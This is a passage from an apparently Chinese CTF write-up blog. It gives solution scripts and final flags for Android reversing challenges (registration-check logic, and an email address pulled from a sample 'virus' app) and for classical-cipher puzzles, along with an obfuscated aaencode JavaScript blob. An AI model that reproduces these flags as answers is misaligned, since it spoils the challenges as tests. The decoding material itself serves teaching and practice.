class="string">&#x27;Z&#x27;</span> &amp;&amp; y[i2] &lt; <span class="string">&#x27;a&#x27;</span>) || y[i2] &gt;= <span class="string">&#x27;z&#x27;</span>) &#123;</span><br><span class="line">                y[i2] = (<span class="type">char</span>) (y[i2] - <span class="number">26</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    text.setText(String.valueOf(y));</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面给出解密用的python代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">b = [<span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;v&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;&#123;&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;&#125;&#x27;</span>]</span><br><span class="line">y = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">38</span>):</span><br><span class="line">    <span class="keyword">if</span> (b[i] &lt; <span class="string">&#x27;A&#x27;</span> <span class="keyword">or</span> b[i] &gt; <span class="string">&#x27;Z&#x27;</span>) <span class="keyword">and</span> (b[i] &lt; <span class="string">&#x27;a&#x27;</span> <span class="keyword">or</span> b[i] &gt; <span class="string">&#x27;z&#x27;</span>):</span><br><span class="line">        y.append(b[i])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        y.append(<span class="built_in">chr</span>(<span class="built_in">ord</span>(b[i]) + <span class="number">16</span>))</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&#x27;Z&#x27;</span> &lt; y[i] &lt; <span class="string">&#x27;a&#x27;</span>) <span class="keyword">or</span> y[i] &gt;= <span class="string">&#x27;z&#x27;</span>:</span><br><span class="line">            y[i] = <span class="built_in">chr</span>(<span class="built_in">ord</span>(y[i]) - <span class="number">26</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(y))</span><br><span class="line"><span class="comment"># flag&#123;c164675262033b4c49bdf7f9cda28a75&#125;</span></span><br></pre></td></tr></table></figure><h2 id="注册程序的破解-CTF向-1"><a href="#注册程序的破解-CTF向-1" class="headerlink" title="注册程序的破解(CTF向)"></a>注册程序的破解(CTF向)</h2><h3 id="buu、简单注册器"><a href="#buu、简单注册器" class="headerlink" title="buu、简单注册器"></a>buu、简单注册器</h3><p><strong>题目描述</strong></p><p>生活中难免会有需要使用一些付费的程序，但是没有绿色版怎么办？只能自己逆向看看注册程序的代码是什么逻辑了。 注意：得到的 flag 请包上 flag{} 提交</p><p><strong>解题过程</strong></p><p>看起来很一般的注册程序。。。直接拖入jadx试试，连个保护壳都没有，不过也正好，就是学不到新的知识了可能。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (flag == <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="type">char</span>[] x = <span class="string">&quot;dd2940c04462b4dd7c450528835cca15&quot;</span>.toCharArray();</span><br><span class="line">    x[<span class="number">2</span>] = (<span class="type">char</span>) ((x[<span class="number">2</span>] + x[<span class="number">3</span>]) - <span class="number">50</span>);</span><br><span class="line">    x[<span class="number">4</span>] = (<span class="type">char</span>) ((x[<span class="number">2</span>] + x[<span class="number">5</span>]) - <span class="number">48</span>);</span><br><span class="line">    x[<span class="number">30</span>] = (<span class="type">char</span>) ((x[<span class="number">31</span>] + x[<span class="number">9</span>]) - <span class="number">48</span>);</span><br><span class="line">    x[<span class="number">14</span>] = (<span class="type">char</span>) ((x[<span class="number">27</span>] + x[<span class="number">28</span>]) - <span class="number">97</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">16</span>; i++) &#123;</span><br><span class="line">        <span class="type">char</span> <span class="variable">a</span> <span class="operator">=</span> x[<span class="number">31</span> - i];</span><br><span class="line">        x[<span class="number">31</span> - i] = x[i];</span><br><span class="line">        x[i] = a;</span><br><span class="line">    &#125;</span><br><span class="line">    textview.setText(<span class="string">&quot;flag&#123;&quot;</span> + String.valueOf(x) + <span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不到10行的简单变换，直接出python脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">x = <span class="string">&#x27;dd2940c04462b4dd7c450528835cca15&#x27;</span></span><br><span class="line">x = <span class="built_in">list</span>(x)</span><br><span class="line">x[<span class="number">2</span>] = <span class="built_in">chr</span>(<span class="built_in">ord</span>(x[<span class="number">2</span>]) + <span class="built_in">ord</span>(x[<span class="number">3</span>]) - <span class="number">50</span>)</span><br><span class="line">x[<span class="number">4</span>] = <span class="built_in">chr</span>(<span class="built_in">ord</span>(x[<span class="number">2</span>]) + <span class="built_in">ord</span>(x[<span class="number">5</span>]) - <span class="number">48</span>)</span><br><span class="line">x[<span class="number">30</span>] = <span class="built_in">chr</span>(<span class="built_in">ord</span>(x[<span class="number">31</span>]) + <span class="built_in">ord</span>(x[<span class="number">9</span>]) - <span class="number">48</span>)</span><br><span class="line">x[<span class="number">14</span>] = <span class="built_in">chr</span>(<span class="built_in">ord</span>(x[<span class="number">27</span>]) + <span class="built_in">ord</span>(x[<span class="number">28</span>]) - <span class="number">97</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    a = x[<span class="number">31</span> - i]</span><br><span class="line">    x[<span class="number">31</span> - i] = x[i]</span><br><span class="line">    x[i] = a</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;flag&#123;&#x27;</span> + <span class="string">&#x27;&#x27;</span>.join(x) + <span class="string">&#x27;&#125;&#x27;</span>)</span><br><span class="line"><span class="comment"># flag&#123;59acc538825054c7de4b26440c0999dd&#125;</span></span><br></pre></td></tr></table></figure><h2 id="Android病毒逆向"><a href="#Android病毒逆向" class="headerlink" title="Android病毒逆向"></a>Android病毒逆向</h2><h3 id="相册"><a href="#相册" class="headerlink" title="相册"></a>相册</h3><blockquote><p>描述:你好，这是上次聚会相片，你看看（病毒，不建议安装到手机，提取完整邮箱即为flag） 注意：得到的 flag 请包上 flag{} 提交</p></blockquote><p>题目挺简单的，就是软件没在模拟器上打得开，所以直接就逆向了一下so文件，直接找到最后的base64的三个串，都解一下密，发现</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MTgyMTg0NjUxMjVAMTYzLmNvbQ==</span><br><span class="line">18218465125@163.com</span><br></pre></td></tr></table></figure><p>所以flag就是上面的这个网易邮箱套上个flag即可。</p><h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="古典密码"><a href="#古典密码" class="headerlink" title="古典密码"></a>古典密码</h2><h3 id="培根密码"><a href="#培根密码" class="headerlink" title="培根密码"></a>培根密码</h3><p><a href="http://rumkin.com/tools/cipher/baconian.php">培根密码在线解密</a></p><h4 id="GUET-CTF2019-NO-SOS"><a href="#GUET-CTF2019-NO-SOS" class="headerlink" title="[GUET-CTF2019]NO SOS"></a>[GUET-CTF2019]NO SOS</h4><p>原来题目上面都说了不是SOS也就是莫斯电码，而且如果是摩斯密码的话，没给出分隔符也是不好解的。所以这里是培根密码，本来只是AB这两个字符的故事，但是这两个字符可以使用其他的字符来表示，所以培根密码的形式是各式各样的都有，这里把<code>.</code>换成<code>A</code>、把<code>-</code>换成<code>B</code>即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">..-.-.-.–…….–..-…-..-…–.-.-….-..-..–.-.-..-.-..—-</span><br></pre></td></tr></table></figure><p>太坑爹了，这个格式竟然还有错误，要修改为下面的内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">..-.-.-.--.......--..-...-..-...--.-.-....-..-..--.-.-..-.-..----</span><br></pre></td></tr></table></figure><p>然后</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>s = <span class="string">&#x27;..-.-.-.--.......--..-...-..-...--.-.-....-..-..--.-.-..-.-..----&#x27;</span>.replace(<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;A&#x27;</span>).replace(<span class="string">&#x27;-&#x27;</span>,<span class="string">&#x27;B&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(s)</span><br><span class="line">AABABABABBAAAAAAABBAABAAABAABAAABBABABAAAABAABAABBABABAABABAABBBB</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>然后粘贴出去在线培根解密即可。</p><p><img src="/2021/05/28/CTF//image-20210729205524795.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;guetkkp&#125;</span><br></pre></td></tr></table></figure><h3 id="希尔密码"><a href="#希尔密码" class="headerlink" title="希尔密码"></a>希尔密码</h3><p><a href="https://www.cnblogs.com/mcprimer/articles/1418967.html">什么是希尔密码</a></p><h4 id="UTCTF2020-hill"><a href="#UTCTF2020-hill" class="headerlink" title="[UTCTF2020]hill"></a>[UTCTF2020]hill</h4><p>给出的内容为<code>wznqca&#123;d4uqop0fk_q1nwofDbzg_eu&#125;</code>，<code>wznqca</code>对应的内容就是<code>utflag</code>，而且这种加密是只针对字母来的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">s = <span class="string">&#x27;wznqcaduqopfkqnwofDbzgeu&#x27;</span></span><br><span class="line">flag_pre = <span class="string">&#x27;utflag&#x27;</span></span><br><span class="line">dic = string.ascii_letters</span><br><span class="line"><span class="comment"># 猜测n为2，那么密钥就是2行2列的矩阵，与之相乘的矩阵也必定是2行的，故可以使用下面的方式爆破key</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getkey</span>(<span class="params">a1, b1, c1, a2, b2, c2, a3, b3, c3</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">            <span class="keyword">if</span> (a1 * i + b1 * j) % <span class="number">26</span> == c1 <span class="keyword">and</span> (a2 * i + b2 * j) % <span class="number">26</span> == c2 <span class="keyword">and</span> (a3 * i + b3 * j) % <span class="number">26</span> == c3:</span><br><span class="line">                <span class="keyword">return</span> (i, j)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">x1 = getkey(<span class="number">22</span>, <span class="number">25</span>, <span class="number">20</span>, <span class="number">13</span>, <span class="number">16</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">0</span>)  <span class="comment"># wzu nqt caa</span></span><br><span class="line">x2 = getkey(<span class="number">22</span>, <span class="number">25</span>, <span class="number">19</span>, <span class="number">13</span>, <span class="number">16</span>, <span class="number">11</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">6</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(s), <span class="number">2</span>):</span><br><span class="line">    flag += dic[(x1[<span class="number">0</span>] * dic.index(s[i]) + x1[<span class="number">1</span>] * dic.index(s[i + <span class="number">1</span>])) % <span class="number">26</span>]</span><br><span class="line">    flag += dic[(x2[<span class="number">0</span>] * dic.index(s[i]) + x2[<span class="number">1</span>] * dic.index(s[i + <span class="number">1</span>])) % <span class="number">26</span>]</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># utflag&#123;d4nger0us_c1pherText_qq&#125;</span></span><br></pre></td></tr></table></figure><h3 id="四方密码"><a href="#四方密码" class="headerlink" title="四方密码"></a>四方密码</h3><p><a href="http://ctf.ssleye.com/four.html">四方密码在线</a></p><p><a href="https://wtool.com.cn/four.html">四方密码在线2</a></p><h4 id="四面八方"><a href="#四面八方" class="headerlink" title="四面八方"></a>四面八方</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">key1:security</span><br><span class="line">key2:information</span><br><span class="line"></span><br><span class="line">securityabdfghklmnopqvwxz</span><br><span class="line">informatbcdeghklpqsuvwxyz</span><br><span class="line">密文啊这是，骚年加油：zhnjinhoopcfcuktlj</span><br><span class="line"></span><br><span class="line">解出来是：ypqcgaodrtccesnkqa</span><br></pre></td></tr></table></figure><p><img src="/2021/05/28/CTF//image-20210727201446789.png"></p><p>再qiupquip一下就行了，我没解出来，这也太**了，为啥不直接就得flag呢。。。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">youngandsuccessful</span><br></pre></td></tr></table></figure><h3 id="特殊字符"><a href="#特殊字符" class="headerlink" title="特殊字符"></a>特殊字符</h3><h4 id="ctfshow、crypto3"><a href="#ctfshow、crypto3" class="headerlink" title="ctfshow、crypto3"></a>ctfshow、crypto3</h4><p><strong>TAG: jsfuck、颜文字</strong></p><p>给出的内容是一些特殊的字符，其实看起来是有一些眼熟的，但是就是想不起来，后来看看wp发现是我的浏览器上这个东西乱码</p><p><img src="/2021/05/28/CTF//image-20210720125250839.png"></p><p>我是先<code>另存界面为</code>，然后再打开另存出来的txt就会自动编好正确的码啦</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻   //*´∇｀*/ [&#x27;_&#x27;]; o=(ﾟｰﾟ)  =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)=&#123;ﾟΘﾟ: &#x27;_&#x27; ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==3) +&#x27;_&#x27;) [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ &#x27;_&#x27;)[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +&#x27;_&#x27;)[ﾟｰﾟ] &#125;; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +&#x27;_&#x27;) [c^_^o];(ﾟДﾟ) [&#x27;c&#x27;] = ((ﾟДﾟ)+&#x27;_&#x27;) [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) [&#x27;o&#x27;] = ((ﾟДﾟ)+&#x27;_&#x27;) [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) [&#x27;c&#x27;]+(ﾟДﾟ) [&#x27;o&#x27;]+(ﾟωﾟﾉ +&#x27;_&#x27;)[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +&#x27;_&#x27;) [ﾟｰﾟ] + ((ﾟДﾟ) +&#x27;_&#x27;) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +&#x27;_&#x27;) [ﾟΘﾟ]+((ﾟｰﾟ==3) +&#x27;_&#x27;) [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) [&#x27;c&#x27;]+((ﾟДﾟ)+&#x27;_&#x27;) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) [&#x27;o&#x27;]+((ﾟｰﾟ==3) +&#x27;_&#x27;) [ﾟΘﾟ];(ﾟДﾟ) [&#x27;_&#x27;] =(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +&#x27;_&#x27;) [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+&#x27;_&#x27;) [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +&#x27;_&#x27;) [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +&#x27;_&#x27;) [ﾟΘﾟ]+ (ﾟωﾟﾉ +&#x27;_&#x27;) [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]=&#x27;\\&#x27;; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +&#x27;_&#x27;)[c^_^o];(ﾟДﾟ) [ﾟoﾟ]=&#x27;\&quot;&#x27;;(ﾟДﾟ) [&#x27;_&#x27;] ( (ﾟДﾟ) [&#x27;_&#x27;] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (o^_^o)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (o^_^o)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (o^_^o)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) (&#x27;_&#x27;);</span><br></pre></td></tr></table></figure><p><img src="/2021/05/28/CTF//image-20210720144305920.png"></p><h3 id="波利比奥斯方阵密码"><a href="#波利比奥斯方阵密码" class="headerlink" title="波利比奥斯方阵密码"></a>波利比奥斯方阵密码</h3><p><img src="/2021/05/28/CTF//image-20210726132638982.png" alt="波利比奥斯方阵密码"></p><h4 id="BJDCTF2020-Polybius"><a href="#BJDCTF2020-Polybius" class="headerlink" title="[BJDCTF2020]Polybius"></a>[BJDCTF2020]Polybius</h4><p>题目中给出的信息为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">密文：ouauuuoooeeaaiaeauieuooeeiea</span><br><span class="line">hint：VGhlIGxlbmd0aCBvZiB0aGlzIHBsYWludGV4dDogMTQ=</span><br><span class="line">flag:解出明文后，请加上BJD&#123;&#125;</span><br></pre></td></tr></table></figure><p>将hint解base64之后得明文为<code>The length of this plaintext: 14</code></p><p>但是没有给出加密的表格，也就是棋盘密码中的棋盘，这就要一个个的碰撞，写出脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line">head = <span class="string">&#x27;aeiou&#x27;</span></span><br><span class="line">ciphertext = <span class="string">&#x27;ouauuuoooeeaaiaeauieuooeeiea&#x27;</span></span><br><span class="line">polybiusd = [[<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>)] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>)]</span><br><span class="line"><span class="comment"># 创建波利比奥斯方阵</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">polybius</span>():</span><br><span class="line">    flag = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">6</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">6</span>):</span><br><span class="line">            <span class="keyword">if</span> i == <span class="number">2</span> <span class="keyword">and</span> j == <span class="number">4</span>:</span><br><span class="line">                polybiusd[i][j] = <span class="built_in">chr</span>(<span class="number">96</span> + (i-<span class="number">1</span>) * <span class="number">5</span> + j) + <span class="string">&#x27;\\&#x27;</span> + <span class="built_in">chr</span>(<span class="number">96</span> + (i-<span class="number">1</span>) * <span class="number">5</span> + j + <span class="number">1</span>)</span><br><span class="line">                flag = <span class="number">0</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> flag:</span><br><span class="line">                polybiusd[i][j] = <span class="built_in">chr</span>(<span class="number">96</span> + (i-<span class="number">1</span>) * <span class="number">5</span> + j)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                polybiusd[i][j] = <span class="built_in">chr</span>(<span class="number">96</span> + (i-<span class="number">1</span>) * <span class="number">5</span> + j + <span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(polybiusd)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用itertools.permutations()对字典进行全排列的性质进行字典的创建</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">listall</span>():</span><br><span class="line">    dic = 